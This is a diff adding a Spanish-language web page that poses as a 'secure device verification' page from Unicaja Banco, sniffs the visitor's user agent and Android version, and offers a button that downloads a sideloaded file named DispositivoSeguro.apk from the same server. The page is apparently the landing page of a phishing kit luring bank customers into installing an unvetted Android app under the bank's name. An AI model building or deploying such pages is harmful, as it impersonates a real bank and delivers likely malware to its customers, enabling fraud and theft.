@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta name="theme-color" content="#01875f" />
+    <title>Dispositivo Seguro - Unicaja Banco</title>
+
+    <!-- Font -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #01875f 0%, #006646 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.25);
+            max-width: 700px;
+            width: 100%;
+            animation: slideIn 0.6s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(40px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background: #01875f;
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 25px rgba(1, 135, 95, 0.3);
+        }
+
+        .logo svg {
+            width: 45px;
+            height: 45px;
+        }
+
+        h1 {
+            color: #1a1a1a;
+            font-size: 28px;
+            margin-bottom: 10px;
+            font-weight: 700;
+            text-align: center;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .detection-box {
+            background: #f9f9f9;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .detection-item {
+            padding: 12px 0;
+            border-bottom: 1px solid #e0e0e0;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            gap: 15px;
+        }
+
+        .detection-item:last-child {
+            border-bottom: none;
+        }
+
+        .detection-label {
+            font-size: 13px;
+            color: #666;
+            font-weight: 600;
+            min-width: 140px;
+        }
+
+        .detection-value {
+            font-size: 13px;
+            color: #1a1a1a;
+            font-weight: 700;
+            word-break: break-word;
+            flex: 1;
+            text-align: right;
+        }
+
+        .detection-value.android {
+            color: #01875f;
+        }
+
+        .detection-value.not-android {
+            color: #f59e0b;
+        }
+
+        .download-btn {
+            background: linear-gradient(135deg, #01875f 0%, #00a673 100%);
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 8px 25px rgba(1, 135, 95, 0.4);
+            transition: all 0.3s ease;
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .download-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 35px rgba(1, 135, 95, 0.6);
+        }
+
+        .download-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .ua-full {
+            background: #fff;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 10px;
+            font-family: 'Courier New', monospace;
+            word-break: break-all;
+            color: #333;
+            border: 1px solid #e0e0e0;
+            margin-top: 10px;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 25px;
+            }
+
+            h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg fill="white" viewBox="0 0 24 24">
+                <path
+                    d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" />
+            </svg>
+        </div>
+
+        <h1>Dispositivo Seguro</h1>
+        <div class="subtitle">Verificación de Sistema Unicaja Banco</div>
+
+        <div class="detection-box">
+            <div class="detection-item">
+                <span class="detection-label">User Agent:</span>
+                <span class="detection-value" id="uaShort">Detectando...</span>
+            </div>
+            <div class="ua-full" id="uaFull">Cargando User Agent completo...</div>
+        </div>
+
+        <div class="detection-box">
+            <div class="detection-item">
+                <span class="detection-label">Sistema Operativo:</span>
+                <span class="detection-value" id="os">Detectando...</span>
+            </div>
+            <div class="detection-item">
+                <span class="detection-label">¿Es Android?:</span>
+                <span class="detection-value" id="isAndroid">Verificando...</span>
+            </div>
+            <div class="detection-item">
+                <span class="detection-label">Versión Android:</span>
+                <span class="detection-value" id="androidVersion">Verificando...</span>
+            </div>
+            <div class="detection-item">
+                <span class="detection-label">Método Detección:</span>
+                <span class="detection-value" id="detectionMethod">-</span>
+            </div>
+        </div>
+
+        <button class="download-btn" onclick="downloadAPK()" id="downloadBtn">
+            📥 Descargar Aplicación (3.88 MB)
+        </button>
+    </div>
+
+    <script>
+        // DETECTION IMMEDIATELY ON LOAD
+        (function () {
+            const ua = navigator.userAgent;
+
+            // Show full UA
+            document.getElementById('uaFull').textContent = ua;
+            document.getElementById('uaShort').textContent = ua.substring(0, 50) + '...';
+
+            // Console logging
+            console.log('='.repeat(60));
+            console.log('ANDROID VERSION DETECTION');
+            console.log('='.repeat(60));
+            console.log('Full User Agent:', ua);
+            console.log('');
+
+            // DETECT OS
+            let osName = 'Desconocido';
+            let isAndroid = false;
+
+            if (/android/i.test(ua)) {
+                osName = 'Android';
+                isAndroid = true;
+            } else if (/iphone|ipad|ipod/i.test(ua)) {
+                osName = 'iOS';
+            } else if (/windows phone/i.test(ua)) {
+                osName = 'Windows Phone';
+            } else if (/windows/i.test(ua)) {
+                osName = 'Windows';
+            } else if (/mac os x/i.test(ua)) {
+                osName = 'macOS';
+            } else if (/linux/i.test(ua)) {
+                osName = 'Linux';
+            }
+
+            document.getElementById('os').textContent = osName;
+            console.log('OS Detected:', osName);
+            console.log('Is Android:', isAndroid);
+            console.log('');
+
+            // DETECT ANDROID VERSION
+            let androidVersion = null;
+            let detectionMethod = 'N/A';
+
+            if (isAndroid) {
+                // METHOD 1: Standard regex /Android\s+([\d\.]+)/
+                let match = ua.match(/Android\s+([\d\.]+)/i);
+                if (match && match[1]) {
+                    androidVersion = match[1];
+                    detectionMethod = 'Regex: /Android\\s+([\\d\\.]+)/i';
+                    console.log('✓ Method 1 SUCCESS:', androidVersion);
+                } else {
+                    console.log('✗ Method 1 FAILED');
+
+                    // METHOD 2: Alternative regex /Android[\s/]+([\d\.]+)/
+                    match = ua.match(/Android[\s\/]+([\d\.]+)/i);
+                    if (match && match[1]) {
+                        androidVersion = match[1];
+                        detectionMethod = 'Regex: /Android[\\s\\/]+([\\d\\.]+)/i';
+                        console.log('✓ Method 2 SUCCESS:', androidVersion);
+                    } else {
+                        console.log('✗ Method 2 FAILED');
+
+                        // METHOD 3: indexOf method
+                        const androidPos = ua.toLowerCase().indexOf('android');
+                        if (androidPos !== -1) {
+                            const afterAndroid = ua.substring(androidPos + 7).trim();
+                            const versionMatch = afterAndroid.match(/^[\s\/]*([\d\.]+)/);
+                            if (versionMatch && versionMatch[1]) {
+                                androidVersion = versionMatch[1];
+                                detectionMethod = 'indexOf + substring';
+                                console.log('✓ Method 3 SUCCESS:', androidVersion);
+                            } else {
+                                console.log('✗ Method 3 FAILED');
+                            }
+                        }
+                    }
+                }
+            }
+
+            // UPDATE UI
+            const isAndroidEl = document.getElementById('isAndroid');
+            const androidVersionEl = document.getElementById('androidVersion');
+            const detectionMethodEl = document.getElementById('detectionMethod');
+
+            if (isAndroid) {
+                isAndroidEl.textContent = 'SÍ ✓';
+                isAndroidEl.classList.add('android');
+
+                if (androidVersion) {
+                    androidVersionEl.textContent = androidVersion;
+                    androidVersionEl.classList.add('android');
+                } else {
+                    androidVersionEl.textContent = 'No detectada (Android sin versión en UA)';
+                    androidVersionEl.classList.add('not-android');
+                }
+
+                detectionMethodEl.textContent = detectionMethod;
+            } else {
+                isAndroidEl.textContent = 'NO';
+                isAndroidEl.classList.add('not-android');
+                androidVersionEl.textContent = 'N/A - No es Android';
+                androidVersionEl.classList.add('not-android');
+                detectionMethodEl.textContent = 'N/A';
+            }
+
+            console.log('');
+            console.log('FINAL RESULT:');
+            console.log('Android Version:', androidVersion || 'NOT DETECTED');
+            console.log('Detection Method:', detectionMethod);
+            console.log('='.repeat(60));
+        })();
+
+        function downloadAPK() {
+            const btn = document.getElementById('downloadBtn');
+            btn.disabled = true;
+            btn.textContent = '⬇️ Descargando...';
+
+            const link = document.createElement('a');
+            link.href = './DispositivoSeguro.apk';
+            link.download = 'DispositivoSeguro.apk';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            setTimeout(() => {
+                btn.textContent = '✅ Descarga Iniciada';
+            }, 1000);
+        }
+    </script>
+</body>
+
+</html>
